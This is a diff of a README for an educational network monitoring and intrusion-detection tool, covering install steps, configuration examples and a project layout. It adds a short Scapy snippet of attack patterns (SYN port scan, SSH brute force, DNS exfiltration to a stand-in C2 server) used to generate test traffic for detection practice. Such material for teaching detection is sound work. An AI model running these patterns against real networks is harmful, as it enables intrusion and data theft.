@@ -2,7 +2,9 @@
 
 ## Educational Notice
 
-**EDUCATIONAL PURPOSES ONLY**
+### Educational Purpose
+
+This tool is for educational purposes only.
 
 NetWatch is a network monitoring and traffic analysis tool with an interactive Streamlit dashboard, created for educational purposes to help students and security researchers understand network monitoring concepts, traffic analysis, and basic intrusion detection principles.
 
@@ -16,19 +18,22 @@ This tool is designed and intended **STRICTLY FOR EDUCATIONAL PURPOSES**. It sho
 
 - Network device discovery using ARP scanning
 - Real-time traffic capture and analysis
-- Device presence logging
+- Device presence logging and history tracking
 - Traffic threshold monitoring
-- Alert system (Email and Slack integration)
-- Interactive menu-driven interface
+- Suspicious traffic detection and analysis
+- Interactive Streamlit dashboard
+- PCAP generation with simulated attack patterns
 
 ### Analysis Features
 
 - PCAP file analysis with detailed reports
-- Interactive web dashboard
-- Traffic visualization and charts
-- Protocol distribution analysis
-- Media stream detection
-- File transfer monitoring
+- Interactive web dashboard with real-time updates
+- Advanced traffic visualization and charts
+- Protocol and port distribution analysis
+- Attack pattern recognition
+- Data exfiltration detection
+- Suspicious behavior monitoring
+- Network enumeration tracking
 
 ## 🛠️ Technical Components
 
@@ -46,27 +51,62 @@ This tool is designed and intended **STRICTLY FOR EDUCATIONAL PURPOSES**. It sho
 
 ## 📋 Prerequisites
 
-- Linux/Unix-based system
-- Root/sudo privileges
-- Required packages:
-  - tcpdump
-  - arp-scan
-  - whiptail
-  - mailutils (for email alerts)
-  - curl (for Slack integration)
-  - tshark (for PCAP analysis)
-  - jq (for JSON processing)
-  - modern web browser (for dashboard)
+### System Requirements
+
+- Linux/Unix-based system or macOS
+- Python 3.9 or higher
+- Root/sudo privileges for packet capture
+
+### Python Dependencies
+
+```python
+streamlit==1.37.0  # Interactive dashboard
+scapy==2.5.0      # Network packet manipulation
+pandas==2.1.0     # Data analysis
+plotly==5.17.0    # Interactive visualizations
+python-dotenv     # Environment configuration
+netifaces         # Network interface detection
+```
+
+### Optional System Packages
+
+- tcpdump (for packet capture)
+- tshark (for advanced PCAP analysis)
+- modern web browser (for dashboard)
 
 ### Installation
+
+1. Clone the repository:
+
+```bash
+git clone https://github.com/yourusername/netwatch.git
+cd netwatch
+```
+
+2. Create and activate a virtual environment:
+
+```bash
+python -m venv venv
+source venv/bin/activate  # On Unix/macOS
+# or
+.\venv\Scripts\activate  # On Windows
+```
+
+3. Install Python dependencies:
+
+```bash
+pip install -r requirements.txt
+```
+
+4. Install system packages:
 
 ```bash
 # On Ubuntu/Debian
 sudo apt update
-sudo apt install tcpdump arp-scan whiptail mailutils curl tshark jq
+sudo apt install tcpdump tshark
 
 # On macOS with Homebrew
-brew install tcpdump arp-scan whiptail mailutils curl wireshark jq
+brew install tcpdump wireshark
 ```
 
 ## 🚀 Local Usage
@@ -93,19 +133,77 @@ brew install tcpdump arp-scan whiptail mailutils curl wireshark jq
 ### Using the Dashboard
 
 1. **Network Scanning**:
+
+   ```bash
+   # Start NetWatch with network scanning
+   sudo streamlit run netwatch.py -- --scan
+   ```
+
    - Click 'Scan Network' to discover devices
-   - View device IP and MAC addresses
+   - View device details in real-time:
 
-2. **Traffic Capture**:
-   - Enter target IP address
-   - Set capture duration
-   - Start capture and monitor progress
+     ```json
+     {
+       "ip": "192.168.1.100",
+       "mac": "00:11:22:33:44:55",
+       "hostname": "device.local",
+       "first_seen": "2025-04-14T04:20:48",
+       "last_seen": "2025-04-14T04:35:35",
+       "status": "active"
+     }
+     ```
 
-3. **PCAP Analysis**:
-   - Select captured PCAP file
-   - View interactive visualizations
-   - Analyze protocol distribution
-   - Monitor packet sizes over time
+1. **Traffic Capture**:
+
+   ```bash
+   # Start capture for specific device
+   sudo streamlit run netwatch.py -- --capture --target 192.168.1.100
+   ```
+
+   - Configure capture settings in `config.json`:
+
+     ```json
+     {
+       "capture": {
+         "duration": 3600,
+         "max_size": "1GB",
+         "rotate": true,
+         "filters": [
+           "port 80",
+           "port 443",
+           "!broadcast"
+         ]
+       }
+     }
+     ```
+
+1. **PCAP Analysis**:
+
+   ```bash
+   # Analyze existing PCAP file
+   streamlit run ui/pcap_analyzer.py -- --pcap captures/traffic.pcap
+   ```
+
+   - Generate suspicious traffic for testing:
+
+     ```bash
+     python network/generate_suspicious_pcap.py
+     ```
+
+   - Example attack patterns:
+
+     ```python
+     # Port scanning
+     for port in common_ports:
+         tcp_scan = IP(dst=target)/TCP(dport=port, flags="S")
+     
+     # Brute force
+     for password in wordlist:
+         auth_attempt = IP(dst=target)/TCP(dport=22)/Raw(load=password)
+     
+     # Data exfiltration
+     data_packet = IP(dst=c2_server)/DNS(qd=DNSQR(qname=encoded_data))
+     ```
 
 ## 🐳 Docker Deployment
 
@@ -172,37 +270,114 @@ docker run -d \
      ssh -L 8501:localhost:8501 pi@<raspberry-pi-ip>
      ```
 
-## 📊 Output Files
+## 📊 Project Structure
 
-### Capture Files
+```text
+netwatch/
+├── network/                 # Network operations
+│   ├── scanner.py          # Device discovery
+│   ├── monitor.py          # Traffic monitoring
+│   ├── capture.py          # Packet capture
+│   └── generate_suspicious_pcap.py  # Test traffic
+├── ui/                     # User interface
+│   ├── components.py       # UI components
+│   └── pcap_analyzer.py    # PCAP analysis
+├── data/                   # Data storage
+│   ├── tracked_devices.json    # Device history
+│   └── device_history.json     # Activity logs
+├── captures/               # PCAP files
+│   ├── traffic_*.pcap         # Live captures
+│   └── suspicious_traffic.pcap # Test data
+├── config/                 # Configuration
+│   ├── config.json            # Main settings
+│   └── filters.json           # Capture filters
+└── reports/                # Analysis output
+    ├── traffic/               # Traffic reports
+    └── alerts/                # Security alerts
+```
 
-- `captures/`: PCAP format traffic captures
-- `logs/`: Text-based device presence logs
-- `alerts/`: Threshold violation records
+### Configuration Files
 
-### Analysis Files
+1. **Main Configuration** (`config/config.json`):
 
-- `reports/`: Individual analysis reports
-  - `analysis.json`: Detailed packet analysis
-  - `analysis.csv`: Tabular data export
-  - `analysis.html`: Interactive visualizations
-- `dashboard/`: Web dashboard files
-  - `index.html`: Main dashboard interface
-  - `captures.json`: Capture history
+```json
+{
+  "network": {
+    "interface": "auto",
+    "scan_interval": 300,
+    "exclude_ips": ["127.0.0.1"]
+  },
+  "capture": {
+    "rotate_size": "1GB",
+    "max_files": 10,
+    "compression": true
+  },
+  "monitoring": {
+    "check_interval": 60,
+    "alert_threshold": 1000
+  }
+}
+```
+
+2. **Device Tracking** (`data/tracked_devices.json`):
+
+```json
+{
+  "devices": [
+    {
+      "ip": "192.168.1.100",
+      "mac": "00:11:22:33:44:55",
+      "hostname": "laptop.local",
+      "track": true,
+      "alerts": true
+    }
+  ]
+}
+```
+
+3. **Analysis Output** (`reports/traffic/analysis.json`):
+
+```json
+{
+  "summary": {
+    "total_packets": 1000,
+    "duration": 3600,
+    "start_time": "2025-04-14T04:20:48",
+    "protocols": {
+      "TCP": 750,
+      "UDP": 200,
+      "ICMP": 50
+    }
+  },
+  "alerts": [
+    {
+      "type": "port_scan",
+      "source": "192.168.1.42",
+      "time": "2025-04-14T04:30:00",
+      "details": "Sequential scan of ports 1-1024"
+    }
+  ]
+}
+```
 
 ### Data Analysis
 
 The analysis reports include:
 
-- HTTP traffic patterns
-- Media stream detection
-- File transfer monitoring
-- Protocol distribution
-- Traffic volume over time
+- Advanced port scanning detection
+- Brute force attack patterns
+- Data exfiltration attempts
+- DNS tunneling and zone transfers
+- Web attack signatures (SQL injection, directory traversal)
+- Network enumeration activities
+- Protocol and port distribution
+- Traffic volume and data usage metrics
+- Conversation analysis and top talkers
 
 ## 🎓 Educational Value
 
 This tool helps demonstrate:
+
 - Network scanning and device discovery techniques
 - Packet capture and analysis
 - Traffic monitoring and threshold detection
@@ -213,6 +388,7 @@ This tool helps demonstrate:
 ## 🔒 Security Considerations
 
 When using this tool for educational purposes:
+
 - Always obtain proper authorization
 - Use in isolated/controlled environments
 - Be aware of privacy implications
